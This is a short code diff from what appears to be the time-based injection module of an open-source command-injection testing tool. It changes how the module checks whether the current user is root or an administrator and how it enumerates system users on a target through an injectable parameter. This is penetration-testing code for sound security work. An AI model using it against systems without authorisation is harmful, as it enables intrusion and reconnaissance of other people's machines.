@@ -90,8 +90,6 @@ def current_user(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_reques
     if menu.options.is_root or menu.options.is_admin:
       if settings.TARGET_OS == "win":
         cmd = settings.IS_ADMIN
-        if not alter_shell:
-          cmd = "\"" + cmd + "\"" 
       else:  
         cmd = settings.IS_ROOT 
       check_how_long, output = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
@@ -106,7 +104,7 @@ def current_user(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_reques
       if shell:
         shell = "".join(str(p) for p in shell)
         if (settings.TARGET_OS == "win" and not "Admin" in shell) or \
-           (settings.TARGET_OS == "unix" and shell != "0"):
+           (settings.TARGET_OS != "win" and shell != "0"):
           sys.stdout.write(Style.BRIGHT + " and it is " + Style.UNDERLINE + "not" + Style.RESET_ALL + Style.BRIGHT + " privileged" + Style.RESET_ALL + ".\n")
           sys.stdout.flush()
           # Add infos to logs file.   
@@ -142,12 +140,11 @@ def system_users(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_reques
   cmd = settings.SYS_USERS  
   check_how_long, output = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
   sys_users = output 
-
   # Windows users enumeration.
   if settings.TARGET_OS == "win":
     if menu.options.verbose:
       print ""
-    sys.stdout.write("\n(*) Executing 'net users' command to enumerate users entries... ")
+    sys.stdout.write("\n(*) Executing the 'net users' command to enumerate users entries... ")
     sys.stdout.flush()
     try:
       if sys_users[0] :
